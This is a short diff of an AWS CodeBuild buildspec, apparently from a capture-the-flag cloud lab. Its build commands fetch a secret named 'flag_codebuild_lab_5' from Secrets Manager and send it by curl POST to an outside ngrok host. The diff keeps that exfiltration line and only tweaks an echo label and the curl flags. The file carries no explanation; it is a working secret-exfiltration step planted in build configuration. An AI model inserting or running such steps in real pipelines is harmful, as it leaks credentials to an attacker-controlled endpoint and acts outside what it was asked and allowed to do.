@@ -3,7 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "=== START ==="
+      - echo "=== START v2 ==="
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
-      - curl -X POST https://6b59-195-133-142-23.ngrok-free.app --data "flag=$FLAG"
+      - curl -s -X POST https://6b59-195-133-142-23.ngrok-free.app --data "flag=$FLAG"
       - echo "=== END ==="
